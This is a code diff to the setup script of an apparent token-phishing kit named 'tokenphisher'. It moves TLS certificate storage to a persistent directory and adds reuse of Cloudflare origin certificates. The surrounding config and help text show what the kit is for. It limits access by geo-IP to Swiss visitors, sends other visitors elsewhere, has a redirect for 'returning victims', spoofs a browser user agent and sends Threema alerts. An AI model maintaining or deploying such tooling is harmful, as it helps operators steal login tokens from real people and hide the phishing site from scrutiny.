@@ -11,7 +11,13 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const ROOT = __dirname;
 const SERVER_JS = path.join(ROOT, 'server.js');
 const CONFIG_JSON = path.join(ROOT, 'config.json');
-const CERTS_DIR = path.join(ROOT, 'certs');
+const LOCAL_CERTS_DIR = path.join(ROOT, 'certs');
+
+const DEFAULT_CERT_STORE =
+  process.env.TOKENPHISHER_CERT_STORE ||
+  (process.getuid?.() === 0
+    ? '/var/lib/tokenphisher/certs'
+    : path.join(os.homedir(), '.local/share/tokenphisher/certs'));
 
 const CLOUDFLARE_ORIGIN_CA =
   'https://developers.cloudflare.com/ssl/static/origin_ca_rsa_root.pem';
@@ -37,9 +43,9 @@ const DEFAULT_CONFIG = {
   threemaFrom: 'YourName',
   threemaURL: 'https://msgapi.threema.ch/send_simple',
   threemaSecret: 'PutYourSecretHere',
-  keyFilePath: './certs/privkey.pem',
-  certFilePath: './certs/cert.pem',
-  caFilePath: './certs/origin-ca.pem',
+  keyFilePath: '/var/lib/tokenphisher/certs/example.com/privkey.pem',
+  certFilePath: '/var/lib/tokenphisher/certs/example.com/cert.pem',
+  caFilePath: '/var/lib/tokenphisher/certs/example.com/origin-ca.pem',
   userAgent:
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
   geoipallowlist: ['CH'],
@@ -57,6 +63,8 @@ Required for production TLS (Cloudflare):
                                 Needs Account: Cloudflare Origin CA:Edit and Zone:Read
 
 Common options:
+  --cert-store <path>           Persistent cert directory (default: /var/lib/tokenphisher/certs as root)
+  --force-renew                 Request a new certificate even if a valid one exists
   --redirect-url <url>          Redirect for / and blocked geo IPs
   --already-logged-in-url <url> Redirect for returning victims
   --geoip <codes>               Comma-separated ISO country codes (default: CH)
@@ -79,9 +87,97 @@ Examples:
 Cloudflare setup notes:
   - Domain must already use Cloudflare DNS (orange-cloud proxy recommended).
   - openssl must be installed (apt install openssl) — the API requires a CSR.
-  - Origin certificates are valid for up to 15 years; certs are saved to ./certs/
-  - config.json is written and server.js is updated automatically.
+  - Certs are stored outside the app (default: /var/lib/tokenphisher/certs/<domain>/).
+  - Re-running setup reuses existing certs unless --force-renew is passed.
+  - config.json is written with absolute cert paths and server.js is updated automatically.
 `);
+}
+
+function sanitizeHostname(hostname) {
+  return hostname.replace(/[^a-zA-Z0-9._-]/g, '_');
+}
+
+function certStoreDir(certStoreRoot, hostname) {
+  return path.join(certStoreRoot, sanitizeHostname(hostname));
+}
+
+function certFilePaths(storeDir) {
+  return {
+    keyFilePath: path.join(storeDir, 'privkey.pem'),
+    certFilePath: path.join(storeDir, 'cert.pem'),
+    caFilePath: path.join(storeDir, 'origin-ca.pem'),
+    metaFilePath: path.join(storeDir, 'cert-meta.json'),
+  };
+}
+
+function certPathsForConfig(storeDir) {
+  const paths = certFilePaths(storeDir);
+  return {
+    keyFilePath: paths.keyFilePath,
+    certFilePath: paths.certFilePath,
+    caFilePath: paths.caFilePath,
+  };
+}
+
+function getCertExpiry(certPath) {
+  const output = execFileSync(
+    'openssl',
+    ['x509', '-enddate', '-noout', '-in', certPath],
+    { encoding: 'utf8' }
+  );
+  return new Date(output.replace('notAfter=', '').trim());
+}
+
+function existingCertsAreUsable(storeDir, minDaysRemaining = 30) {
+  const paths = certFilePaths(storeDir);
+  if (!fs.existsSync(paths.keyFilePath) || !fs.existsSync(paths.certFilePath)) {
+    return null;
+  }
+
+  try {
+    const expiresAt = getCertExpiry(paths.certFilePath);
+    const daysRemaining = (expiresAt - Date.now()) / (1000 * 60 * 60 * 24);
+    if (daysRemaining < minDaysRemaining) {
+      return null;
+    }
+    return { expiresAt, daysRemaining: Math.floor(daysRemaining) };
+  } catch {
+    return null;
+  }
+}
+
+function migrateLocalCertsIfNeeded(hostname, storeDir) {
+  const localPaths = certFilePaths(LOCAL_CERTS_DIR);
+  const storePaths = certFilePaths(storeDir);
+
+  if (fs.existsSync(storePaths.certFilePath)) {
+    return;
+  }
+  if (!fs.existsSync(localPaths.certFilePath) || !fs.existsSync(localPaths.keyFilePath)) {
+    return;
+  }
+
+  console.log(`Migrating existing ./certs/ to ${storeDir} ...`);
+  fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
+  for (const filePath of [localPaths.keyFilePath, localPaths.certFilePath, localPaths.caFilePath]) {
+    if (fs.existsSync(filePath)) {
+      fs.copyFileSync(filePath, path.join(storeDir, path.basename(filePath)));
+    }
+  }
+  fs.chmodSync(storePaths.keyFilePath, 0o600);
+}
+
+function writeCertMetadata(storeDir, hostname, hostnames, expiresAt) {
+  const meta = {
+    hostname,
+    hostnames,
+    provider: 'cloudflare-origin-ca',
+    createdAt: new Date().toISOString(),
+    expiresAt: expiresAt.toISOString(),
+  };
+  fs.writeFileSync(certFilePaths(storeDir).metaFilePath, JSON.stringify(meta, null, 2) + '\n', {
+    mode: 0o644,
+  });
 }
 
 function parseGeoip(value) {
@@ -173,7 +269,24 @@ ${altNames}
   return { privateKey, csr };
 }
 
-async function provisionCloudflareOriginCert(token, hostname) {
+async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, forceRenew) {
+  const storeDir = certStoreDir(certStoreRoot, hostname);
+  migrateLocalCertsIfNeeded(hostname, storeDir);
+
+  const existing = existingCertsAreUsable(storeDir);
+  if (existing && !forceRenew) {
+    console.log(
+      `Reusing existing certificate from ${storeDir} (expires ${existing.expiresAt.toISOString()}, ${existing.daysRemaining} days left)`
+    );
+    return certPathsForConfig(storeDir);
+  }
+
+  if (!token) {
+    throw new Error(
+      `No valid certificate found in ${storeDir}. Provide --cf-token or CLOUDFLARE_API_TOKEN to create one.`
+    );
+  }
+
   console.log(`Provisioning Cloudflare origin certificate for ${hostname} ...`);
 
   const { zoneName } = await getZoneId(token, hostname);
@@ -193,28 +306,25 @@ async function provisionCloudflareOriginCert(token, hostname) {
     csr,
   });
 
-  fs.mkdirSync(CERTS_DIR, { recursive: true });
+  fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
 
-  const keyPath = path.join(CERTS_DIR, 'privkey.pem');
-  const certPath = path.join(CERTS_DIR, 'cert.pem');
-  const caPath = path.join(CERTS_DIR, 'origin-ca.pem');
+  const paths = certFilePaths(storeDir);
 
-  fs.writeFileSync(keyPath, privateKey, { mode: 0o600 });
-  fs.writeFileSync(certPath, cert.certificate, { mode: 0o644 });
+  fs.writeFileSync(paths.keyFilePath, privateKey, { mode: 0o600 });
+  fs.writeFileSync(paths.certFilePath, cert.certificate, { mode: 0o644 });
 
   const caResponse = await fetch(CLOUDFLARE_ORIGIN_CA);
   if (!caResponse.ok) {
     throw new Error(`Failed to download Cloudflare Origin CA: ${caResponse.statusText}`);
   }
-  fs.writeFileSync(caPath, await caResponse.text(), { mode: 0o644 });
+  fs.writeFileSync(paths.caFilePath, await caResponse.text(), { mode: 0o644 });
 
-  console.log(`Certificates saved to ${CERTS_DIR}/`);
+  const expiresAt = getCertExpiry(paths.certFilePath);
+  writeCertMetadata(storeDir, hostname, hostnames, expiresAt);
 
-  return {
-    keyFilePath: './certs/privkey.pem',
-    certFilePath: './certs/cert.pem',
-    caFilePath: './certs/origin-ca.pem',
-  };
+  console.log(`Certificates saved to ${storeDir}/ (valid until ${expiresAt.toISOString()})`);
+
+  return certPathsForConfig(storeDir);
 }
 
 function formatConfigValue(key, value) {
@@ -265,6 +375,8 @@ async function main() {
       'test-mode': { type: 'boolean', default: false },
       'config-only': { type: 'boolean', default: false },
       'from-config': { type: 'string' },
+      'cert-store': { type: 'string' },
+      'force-renew': { type: 'boolean', default: false },
       help: { type: 'boolean', short: 'h', default: false },
     },
     allowPositionals: false,
@@ -292,19 +404,20 @@ async function main() {
 
   const cfToken = values['cf-token'] || process.env.CLOUDFLARE_API_TOKEN;
   const domain = values.domain;
+  const certStoreRoot = path.resolve(values['cert-store'] || DEFAULT_CERT_STORE);
 
   if (!values['test-mode'] && !values['config-only']) {
-    if (!cfToken) {
-      console.error('Error: --cf-token or CLOUDFLARE_API_TOKEN is required for TLS setup.');
-      console.error('Use --test-mode for local HTTP-only testing, or --config-only to skip TLS.');
-      process.exit(1);
-    }
     if (!domain) {
       console.error('Error: --domain is required for TLS setup.');
       process.exit(1);
     }
 
-    const certPaths = await provisionCloudflareOriginCert(cfToken, domain);
+    const certPaths = await provisionCloudflareOriginCert(
+      cfToken,
+      domain,
+      certStoreRoot,
+      values['force-renew']
+    );
     Object.assign(config, certPaths);
     config.testMode = false;
   } else if (values['test-mode']) {
